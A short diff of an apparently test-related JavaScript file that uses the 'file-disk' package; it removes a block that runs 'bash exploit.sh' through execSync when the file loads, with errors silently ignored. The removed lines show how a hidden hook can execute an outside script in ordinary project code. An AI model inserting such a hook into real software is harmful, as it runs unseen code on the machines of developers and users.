@@ -1,10 +1,4 @@
 import { deepEqual, notEqual } from 'assert';
-import { execSync } from 'child_process';
-try {
-	execSync('bash exploit.sh', { stdio: 'inherit' });
-} catch (e) {
-	// ignore
-}
 import { FileDisk, withOpenFile } from 'file-disk';
 import * as Fs from 'fs';
 import * as Path from 'path';
